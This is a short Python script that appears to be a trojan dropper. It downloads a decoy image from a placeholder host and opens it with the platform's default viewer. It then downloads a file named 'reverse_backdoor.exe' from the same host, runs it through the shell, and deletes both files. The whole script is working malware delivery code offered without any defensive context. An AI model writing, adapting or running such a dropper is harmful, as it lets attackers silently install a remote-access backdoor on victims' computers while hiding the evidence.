import requests
import subprocess
import tempfile
import os
import platform

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    return file_name

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

file_to_open = download("http://url/image.jpeg")

# Check if the file exists before trying to open it
if os.path.exists(file_to_open):
    if platform.system() == 'Windows':
        subprocess.Popen(['start', file_to_open], shell=True)
    elif platform.system() == 'Darwin':
        subprocess.Popen(['open', file_to_open])
    else:
        subprocess.Popen(['xdg-open', file_to_open])
else:
    print(f"Downloaded file {file_to_open} does not exist.")

backdoor = download("http://url/reverse_backdoor.exe")
subprocess.call(backdoor ,shell=True)

os.remove(file_to_open)
os.remove(backdoor)